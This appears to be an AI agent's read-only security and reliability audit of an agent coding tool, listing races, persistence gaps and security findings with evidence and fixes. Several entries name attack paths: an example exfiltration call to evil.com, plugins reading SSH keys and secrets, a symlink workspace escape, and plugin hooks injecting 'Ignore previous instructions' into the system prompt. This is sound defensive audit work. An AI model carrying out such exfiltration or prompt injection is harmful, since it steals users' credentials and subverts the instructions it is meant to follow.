initial_repo_state.head_message: fix(core): architecture hardening — cache atomicity, coordination bugs, lifecycle gating, placeholder tools, reporting audit
initial_repo_state.dirty_file_count: ~164 files modified, ~60+ untracked (mostly docs/json/ artifacts from prior sessions)

packages_inspected: packages/opencode/src/ (tool/, session/, storage/, context/, plugin/, mcp/, lsp/, campaign/, coordination/, permission/, bus/, control-plane/, file/, pty/, util/, agent/, background/, worktree/)
surfaces_inspected: Context engine and indexing (invalidations, workers, packets)
Desktop IPC and preload bridge (contracts, channels, handlers)
Plugin and MCP capability boundary (capability system, hooks, transport)
Validation, tests, proof gates (EventStore, context, gates)
Security and trust boundary (env, path traversal, CSP, DOMPurify)
Recursion, runaways, unbounded loops (while(true), retry budgets, event loops)

entries.summary: FileLock unguarded check-then-set — concurrent semaphore creation allows parallel writes to same file
entries.evidence: packages/opencode/src/tool/file-lock.ts:9-15 — `const locks = new Map()`, two concurrent `lock()` calls both see `get()` undefined, both `Semaphore.make(1)`, second `set()` silently overwrites first. Two files hold references to different semaphores for the same file.
entries.impact: Data corruption from concurrent writes to same file. Two tools writing to same file can race.
entries.trigger: Two concurrent search_replace/write_file calls on the same file
entries.minimal_fix: Replace module-level Map with Effect Ref<Map<>> and use Ref.modify for atomic check-then-init

entries.summary: Cache inflight entry removed before cache written — race window for duplicate computation
entries.evidence: packages/opencode/src/tool/cache.ts:120-183 — Effect.ensuring cleanup at line 122-127 removes inflight entry BEFORE cache Ref.update at line 144 and BEFORE Deferred.done at line 131
entries.impact: Duplicate computation for same cache key. For cacheable tools with side effects (web fetch, repo clone), this doubles the work.
entries.trigger: Two concurrent requests for same uncached tool result
entries.minimal_fix: Move inflight cleanup from Effect.ensuring to after cache write, or wrap both in single atomic Ref.modify

entries.summary: smart-bash.ts uses spawnSync — blocks Node.js event loop for up to 60s
entries.evidence: packages/opencode/src/tool/smart-bash.ts:76-97 — spawnSync(params.command, [], { shell: true, timeout: 60000 }) blocks entire event loop
entries.impact: Application-wide denial-of-service. No HTTP, WebSocket, or other tool execution during command.
entries.trigger: Agent calls smart_bash with long-running command
entries.minimal_fix: Replace spawnSync with async spawn from child_process

entries.summary: Repair budget never initialized — retryBudgets always {} makes repair_budget_exhausted always true
entries.evidence: campaign/state-machine.ts:335-341 — budget = state.retryBudgets['repair'] ?? 0, but budget initialized as {} at secretary.ts:248. repair_budget_exhausted always returns true.
entries.impact: Repair loop never executes — first repair cycle always goes to blocked state
entries.trigger: Any lane entering repairing state
entries.minimal_fix: Initialize retryBudgets: { repair: 3 } in makeInitialSMState()

entries.summary: Stale context presented as fresh — invalidation bus never wired to real file edit events
entries.evidence: context/invalidation-registry.ts:35-38 defines scope-to-event mappings. context/invalidation-bus.ts notify() is only called from agent-facing tools (mark_context_stale, request_context_refresh). No code calls notify('file.edited') when a file is actually changed via smart_write, search_replace, or apply_patch.
entries.impact: File summaries, symbol outlines, working set rankings remain stale indefinitely after file edits
entries.trigger: Any file write via tool — context never invalidates
entries.minimal_fix: Wire FileWatcher.Event.Updated to ContextInvalidationBus.notify('file.edited')

entries.summary: Binder is in-memory only — all lane state lost on process restart
entries.evidence: campaign/binder.ts:264 — const store = Ref.make<Map<string, Binder>>() with no persistence layer
entries.impact: After restart, all binder data (checkpoint commits, validation results, artifact digests) is permanently lost
entries.trigger: Process restart or crash during multi-lane campaign
entries.minimal_fix: Persist binders to EventStore or database; reconstruct from events on startup

entries.summary: Plugin capability escape — full Node.js/Bun process access, no sandboxing
entries.evidence: plugin/index.ts:226-240 — PluginInput passes full SDK client, project, worktree, directory with no sandbox restrictions
entries.impact: Any plugin has full filesystem, network, child_process, env access
entries.trigger: Loading any external plugin
entries.minimal_fix: Implement process-level sandboxing (child process, VM context, or --experimental-vm-modules)

entries.summary: Plugin arbitrary file read — same-process execution with fs access to any file
entries.evidence: plugin/index.ts:226-230 — PluginInput exposes project, directory, worktree. Plugin can call fs.readFileSync on any path.
entries.impact: Plugin can read .env, ~/.ssh/id_rsa, tokens, configs
entries.trigger: Plugin calls fs.readFileSync
entries.minimal_fix: Process-level sandbox with restricted fs access

entries.summary: Plugin network access — no egress filtering, exfiltration possible
entries.evidence: plugin/capability/hook-dispatch-guard.ts:12-28 gates hook dispatch only — plugin can still call fetch() directly
entries.impact: Plugin can exfiltrate secrets, source code, prompt content to external server
entries.trigger: Plugin calls fetch('https://evil.com/exfil')
entries.minimal_fix: Process-level sandbox with egress allowlist filtering

entries.summary: Plugin secrets exposure — config hook stripping bypassable via direct fs access
entries.evidence: plugin/index.ts:181-195 stripSecrets removes apiKey/token from config object, but plugin can read config file directly with fs
entries.impact: Secrets trivially bypassable — config stripping is cosmetic
entries.trigger: Plugin reads ~/.config/opencode/config.json with fs.readFileSync
entries.minimal_fix: Process-level sandbox with secrets isolation

entries.summary: Plugin prompt injection — 6 hook surfaces can replace system prompt, messages, tool descriptions
entries.evidence: plugin/src/index.ts:282-296 — experimental.chat.system.transform and experimental.chat.messages.transform can replace system prompt and messages entirely with no content validation
entries.impact: Plugin can inject 'Ignore previous instructions', add fake user messages, redirect tool behaviors
entries.trigger: Plugin registers system/message transform hook
entries.minimal_fix: Read-only flag for system transform hooks; gate behind high-risk capability

entries.summary: Test/validation results never recorded to EventStore — 'test_run' events never emitted
entries.evidence: tool/test.ts never imports EventStore. smart-bun.ts writes to analytics file only. agent-queries.ts queries come from query eventType='test_run' — no code produces this event.
entries.impact: get_validation_context always returns null. latestValidation always undefined. Validation context always empty.
entries.trigger: Any tool test or smart_bun(command='test') execution
entries.minimal_fix: Make test.ts and smart-bun.ts emit tool.test / tool.validate events via bus.publish → EventStore.record

entries.summary: Validation parser worker disconnected — subscribes to scope never triggered, queries empty store
entries.evidence: validation-parser-worker.ts subscribes to 'validation_clean_state' which invalidation-registry.ts only maps from session.next.tool.success/failed — not from tool.test/tool.validate completions. Queries EventStore for failures in last 5 minutes — always empty.
entries.impact: Validation context is always empty. Entire parser worker is dead code.
entries.trigger: Any invalidation — worker runs, finds nothing, clears context, reports success
entries.minimal_fix: Wire invalidation to trigger on tool.test/tool.validate completions. Replace 5-minute window with session-scoped query.

entries.summary: Crash lock never deleted — every restart after crash permanently enters safe mode
entries.evidence: desktop/main/index.ts:294 writes crashLock. No code in any quit handler deletes it.
entries.impact: Every restart after any crash goes into safe mode permanently. User sees 'Previous session crashed' dialog forever.
entries.trigger: Any process crash
entries.minimal_fix: Add unlinkSync(crashLock) in will-quit handler (wrapped in try/catch)

entries.summary: Session delete cascades nothing — orphaned messages/parts/todos/events accumulate forever
entries.evidence: session/session.ts:608-628 — sync.remove(sessionID) only deletes from event_sequence and event tables. Messages, parts, todos, permissions, runtime_events are never cleaned up.
entries.impact: Orphaned records accumulate, space wasted, FK confusion on session ID reuse
entries.trigger: Any session deletion
entries.minimal_fix: Actually — this is a partial fix due to FK issue (see H03). Fix: enable FK enforcement, then verify cascade works.

entries.summary: Foreign keys NOT enabled in production SQLite — cascade deletes are silent no-ops
entries.evidence: storage/db.ts:54-58 creates PGlite/bun:sqlite without PRAGMA foreign_keys=ON. Test code has it at test/storage/json-migration.test.ts:79. Production never sets it.
entries.impact: All ON DELETE CASCADE definitions are silently ignored. Orphan accumulation on every delete.
entries.trigger: Any session/workspace/project delete
entries.minimal_fix: Add 'PRAGMA foreign_keys = ON' right after database open in db.ts and db.pg.ts

entries.summary: PGlite migrations have no version tracking — re-run destroys schema
entries.evidence: storage/db.pg.ts:70-87 — applyMigrations reads all migration SQL files and executes every statement unconditionally. No __drizzle_migrations table, no schema version check.
entries.impact: Running migration twice fails with 'relation already exists'. Manual recovery required.
entries.trigger: Application restart, concurrent startup, upgrade deploy
entries.minimal_fix: Add CREATE TABLE IF NOT EXISTS or track applied migrations in a _migrations meta-table

entries.summary: PGlite migrations not in transaction — partial migration corrupts schema
entries.evidence: storage/db.pg.ts:75-82 — each exec() commits independently. If statement 5 of 10 fails, statements 1-4 are already committed.
entries.impact: Schema corruption — some tables/columns exist, others don't
entries.trigger: Transient failure during migration (disk full, timeout, constraint violation)
entries.minimal_fix: Wrap migration statements in a transaction

entries.summary: Coordination claims have NO lease/TTL — crashed agents leave orphaned claims forever
entries.evidence: tool/coordination.ts:54-66 — CoordinationClaimTable has status, created_at, released_at. No expiry column. created_at never checked for staleness.
entries.impact: Crashed agents leave zombie claims. New orchestrator can't reclaim tasks. Downstream code sees phantom claims.
entries.trigger: Agent crash mid-claim
entries.minimal_fix: Add expires_at column. On stale read, auto-release. Periodic sweep.

entries.summary: No validation gate before checkpoint — checkpoint can be created without passing tests
entries.evidence: tool/checkpoint.ts:21 — no test/validation status check before creating checkpoint record
entries.impact: Agent can checkpoint and publish untested changes
entries.trigger: Any checkpoint call without prior validation
entries.minimal_fix: Add validation readiness check: require passing test/validate run since last edit

entries.summary: Campaign state is in-memory only — orchestrator crash loses all campaign state
entries.evidence: campaign/orchestrator.ts:218 — const store = Ref.make<Map<string, OrchestratorCampaignState>>(). secretary.ts:255 — activeLanes = Ref.make(new Map())
entries.impact: Process crash loses all campaign orchestrator states, lane states, repair budgets, transition histories
entries.trigger: Any process crash or restart
entries.minimal_fix: Persist events to EventStore on every transition; add recoverCampaign(campaignId) that replays events through reduceCampaignState

entries.summary: Summary not bound to file digest — agent sees summary from different file version
entries.evidence: context/workers/summary-worker.ts:54-58 — summary stored without digest match verification. No summaryDigest field on FileContext.
entries.impact: Agent sees potentially mismatched file content vs summary
entries.trigger: File edited between summary generation and context packet assembly
entries.minimal_fix: Add summaryDigest field to FileContext; compare on read

entries.summary: Context contamination — single global scratchpad shared across all agents/lanes
entries.evidence: agent/scratchpad.ts:33-41 — single Ref<Scratchpad>, not keyed by session or lane ID
entries.impact: Cross-lane contamination. Agent A's hypothesis/facts leak into Agent B's reasoning context.
entries.trigger: Two concurrent agents/lanes updating scratchpad
entries.minimal_fix: Key scratchpad Ref by sessionID or laneID

entries.summary: Context worker failures invisible — all workers swallow errors with Effect.ignore
entries.evidence: All context workers end with .pipe(Effect.ignore) — summary-worker.ts:96, file-index-worker.ts:46, duckdb-projection-worker.ts:93, validation-parser-worker.ts:100, cleanup-worker.ts:61
entries.impact: Silent data loss. Context engine appears to work but returns stale/empty data. Users/agents cannot distinguish 'current' from 'silently failed'.
entries.trigger: Any worker exception (DuckDB unavailable, file deleted mid-read, disk full)
entries.minimal_fix: Replace Effect.ignore with structured error logging and ContextWorkerFailure event on bus

entries.summary: DuckDB context projection VIEW and TABLE share same name with different schema — silent ranking failure
entries.evidence: duckdb-projection-worker.ts:8-19 creates VIEW _ctx_file_relevance. schema.duckdb.ts:131-142 creates TABLE _ctx_file_relevance. Different columns: VIEW has file_path/event_count/sessions/actors/last_touched, TABLE has recency_score/edit_count/failure_count/claim_count. rankWorkingSet queries TABLE columns.
entries.impact: Depending on creation order, either view creation fails silently (Effect.ignore) or ranking queries fail at runtime
entries.trigger: duckdb-projection-worker runs after schema init
entries.minimal_fix: Use different names for views (_v_ctx_file_relevance) or only run projections when tables unavailable

entries.summary: DuckDB stale projections not detected — view rebuilt but underlying table data not refreshed
entries.evidence: pipeline.ts:48-52 — CREATE OR REPLACE TABLE loads snapshot, then duckdb-projection-worker.ts:82-98 rebuilds VIEWs on same stale data. No incremental import step.
entries.impact: Context ranking operates on stale data after Postgres events arrive
entries.trigger: Any runtime_events insert after pipeline last ran
entries.minimal_fix: Add incremental import step in projection worker or re-run pipeline on invalidation

entries.summary: DuckDB query injection risk — manual SQL string escaping insufficient
entries.evidence: context/duckdb-rank.ts:73,80,116,146,179,225 — manual ' escaping for sessionId/limit parameters
entries.impact: SQL injection into DuckDB queries if sessionId contains crafted payload
entries.trigger: Agent with crafted sessionId or workspace file path
entries.minimal_fix: Use parameterized queries or prepared statements

entries.summary: Task tool cancel — parent fiber continues running after abort
entries.evidence: tool/task.ts:283-325 — onAbort forks cancel effect but parent fiber continues runTask() until completion
entries.impact: Wasted computation, partial state — subagent cancelled but parent records task output via completeToolCall
entries.trigger: User clicks cancel while task tool executing
entries.minimal_fix: Replace runCancel.fork(cancel) with runCancel.fork(Effect.interrupt)

entries.summary: Tool execution continues to completion after cancellation
entries.evidence: session/tools.ts:126-128 — abort signal checked only AFTER tool completes. Tool at line 110 runs to completion regardless of cancellation.
entries.impact: All tool calls run to completion when cancelled. Stale results written to session history.
entries.trigger: Any tool call cancelled by user or timeout
entries.minimal_fix: Add interruptible boundary; propagate AI SDK abort signal as Effect interruption

entries.summary: Publish checkpoint doesn't verify git state — just flips boolean
entries.evidence: tool/publish_checkpoint.ts:31-41 — only sets published:true. No git commit check, no SHA integrity, no push.
entries.impact: Publication is a cosmetic flag with no actual git protection
entries.trigger: Calling publish_checkpoint
entries.minimal_fix: Add verification: git tree hash match, lane state machine check, push verification

entries.summary: No Database.close() wired to shutdown — PGlite WAL may be unclean
entries.evidence: storage/db.ts:69-73 — close() exists but never called from lifecycle path. Not registered on process exit signals.
entries.impact: PGlite may not flush WAL/shm files. Resource leak on repeated init/close cycles.
entries.trigger: App shutdown
entries.minimal_fix: Wire Database.close() into app shutdown sequence

entries.summary: before-quit and will-quit both fire killSidecar fire-and-forget — race on shutdown
entries.evidence: desktop/main/index.ts:190-196 — both fire void killSidecar(). SIGINT/SIGTERM handlers also fire killSidecar().
entries.impact: Race on shutdown sequence. Second killSidecar sees server=null, is no-op.
entries.trigger: User quits app
entries.minimal_fix: Consolidate into one handler. will-quit is sufficient.

entries.summary: LSP shutdown has no timeout — blocks instance disposal forever
entries.evidence: lsp/lsp.ts:202, lsp/client.ts:693 — client.shutdown() has no timeout, connection.end() waits for acknowledgement indefinitely
entries.impact: Unresponsive LSP server blocks shutdown forever
entries.trigger: Instance dispose while LSP server stuck
entries.minimal_fix: Add timeout to LSP shutdown

entries.summary: Plugin IPC bridge broken — preload never exposes pluginSend/pluginOn/pluginOff, renderer always degrades to noop
entries.evidence: preload/index.ts:6-108 — zero plugin-transport methods. renderer/plugin-transport.ts:28-33 checks api?.pluginSend — always undefined, falls through to createNoopTransport().
entries.impact: All desktop plugins silently broken if they depend on IPC bridge
entries.trigger: Any createPluginTransport() call in renderer
entries.minimal_fix: Implement plugin IPC methods in preload/index.ts or remove dead code

entries.summary: PTY spawn leaks full process.env including API keys — sanitizeEnv not called
entries.evidence: pty/index.ts:198-204 — spreads ...process.env without sanitizeEnv() call. Contrast: cross-spawn-spawner.ts:109 does call sanitizeEnv().
entries.impact: Credential exfiltration from every spawned terminal (user terminals, MCP subprocesses)
entries.trigger: Any PTY spawn or terminal session
entries.minimal_fix: Replace ...process.env with ...sanitizeEnv(process.env)

entries.summary: containsPath does not resolve symlinks — workspace escape via symlink
entries.evidence: core/filesystem.ts:244-246 — contains() uses path.relative string comparison without realpath resolution
entries.impact: Symlink inside workspace pointing to /etc/passwd or ~/.ssh/id_rsa bypasses path containment check
entries.trigger: Read tool pointed at a symlink to outside workspace
entries.minimal_fix: Resolve realpath on both parent and child before string comparison

entries.summary: MCP auth tokens stored unencrypted on disk
entries.evidence: mcp/auth.ts:35 — OAuth access/refresh tokens stored as plain JSON in mcp-auth.json
entries.impact: Credential theft from local disk
entries.trigger: MCP server OAuth flow
entries.minimal_fix: Encrypt with safeStorage (Electron) or OS keychain

entries.summary: Sidecar process env includes OPENCODE_SERVER_PASSWORD — leaked to subprocesses
entries.evidence: sidecar.ts:108-113 — Object.assign(process.env, { OPENCODE_SERVER_PASSWORD: password })
entries.impact: Server password leaked to all subprocesses (PTY, MCP stdio, plugins)
entries.trigger: Any subprocess spawned by sidecar
entries.minimal_fix: Use pipe or abstract credential retrieval behind service

entries.summary: Orphan IPC channel EVENT_EXPLAIN — defined in contract but no handler registered
GitHub IPC handlers inconsistent — raw throws, missing withIpcResult wrapping
Module-scope renderer subscriptions never cleaned up — duplicate listeners on hot-reload
All IPC handlers registered before safe mode check — safe mode page has full IPC surface
DuckDB memory_limit not configured — 4 concurrent processes could each use 80% RAM
DuckDB schema drift — 4 fields missing from _pipeline_runtime_event vs PGlite RuntimeEventTable
Roadmap tool file writes not atomic — crash corrupts active.v1.json
Storage layer file writes not atomic — no write-to-temp-then-rename
LSP clients.array push race — duplicate LSP client entries on concurrent file open
LSP spawning Map check-then-set race — duplicate LSP process for same root
Effect.orDie converts all tool errors to defects — interruptions bypass TypedResult
JSON.parse in comment-plan.ts with no error handling — corrupt plans crash tool
search_replace.ts partial write on multi-file failure — no rollback
FileLock module-level Map never cleaned — unbounded memory growth
Bus PubSub getOrCreate race — concurrent subscriber registration can lose events
No defined shutdown order for finalizers — dependency NPE risk
No uncaughtException/unhandledRejection handler in desktop main process
Sidecar migration interruption leaves partial SQLite state
Stale tools after plugin disconnect — no removal mechanism in tool registry
Unbounded plugin events — no rate limiting on event dispatch
Active tools not cancelled on shutdown — shell subprocess orphans possible
EventStore query lacks 'id' filter — client-side full scan on 100-record default
openLink opens any URL without validation — protocol handler hijacking risk
openPath accepts arbitrary app parameter from renderer
storeGet reads arbitrary electron-store keys — data exfiltration risk
Plugin tool loading doesn't resolve symlinks — code execution via symlink in config dirs
Debug export includes network logs with potential auth headers
Workspace syncWorkspaceLoop reconnects indefinitely with no max attempts

highest_risk_systemic_patterns: 1. Invalidation bus never wired to real events — stale context is systemic. Multiple workers (summary, ranking, validation) all depend on an invalidation bus that is never triggered by production events.

2. No sandboxing for plugins — all 5 CRITICAL plugin findings stem from same root cause: plugins run in-process with full host access. The capability system is partially wired but cannot prevent direct API abuse.
3. Validation pipeline is disconnected — test results are never fed into EventStore, the validation parser worker is dead code, and there's no gate before checkpoint creation.

4. State machines exist but aren't enforced — the campaign state machine has bugs (budget not initialized, entry actions ignored) but also isn't wired into production execution (dead code per Scout B).
5. Shutdown is not orchestrated — crash lock never cleaned, Database.close() never called, events not flushed, no defined shutdown order.

fixes_recommended.summary: Delete crash lock in will-quit handler
Enable PRAGMA foreign_keys = ON in production SQLite
Add try/catch around JSON.parse in comment-plan.ts
Add sanitizeEnv() call in PTY spawn
Wire invalidation bus to file edit events
Prevent plugin tools from colliding with built-in names

tests_not_run: Could not run tests — package.json root script forbids 'do not run tests from root'. Need to run from packages/opencode/. Requires bun install + test environment setup.
remaining_risks: Plugin sandboxing — requires architectural change (process isolation). Cannot fix with narrow patch.
Campaign state machine not wired — entire campaign/ directory is speculative architecture. Would require production wiring.
Workspace sync reconnection loop — needs max-attempt limit.
Session prompt loop default Infinity — needs explicit step limit.
Bus backpressure — all PubSubs are unbounded, no backpressure strategy.
DuckDB stale projections — needs incremental import or full pipeline re-run on invalidation.
No defined shutdown order — requires lifecycle refactoring.
Validation pipeline disconnected — requires EventStore wiring and invalibration bus integration.
Electron CSP missing — needs Content-Security-Policy header addition.
MCP auth tokens unencrypted — needs safeStorage encryption.
PTY env blocklist — sanitizeEnv() not called in pty/index.ts.
recommended_next_campaign: CAMPAIGN 2: Fix the invalidation bus (P0) — wire to file edit events, enable context freshness
CAMPAIGN 3: Implement plugin sandboxing (P0) — process-level isolation for all external plugins
CAMPAIGN 4: Wire validation pipeline (P1) — connect test tool to EventStore, hook up parser worker
CAMPAIGN 5: Security hardening (P1) — CSP, MCP token encryption, path resolution, openLink validation
CAMPAIGN 6: Lifecycle audit completion (P2) — shutdown orchestration, Database.close(), signal handling
CAMPAIGN 7: Campaign state machine activation (P2) — wire into production execution, fix budget bugs

git_status_at_end.head: 61a7810d86bb24ba4b11c0493dbe333de5f50457
git_status_at_end.note: No files were modified during this bug-hunt session (read-only campaign). All findings are documented.
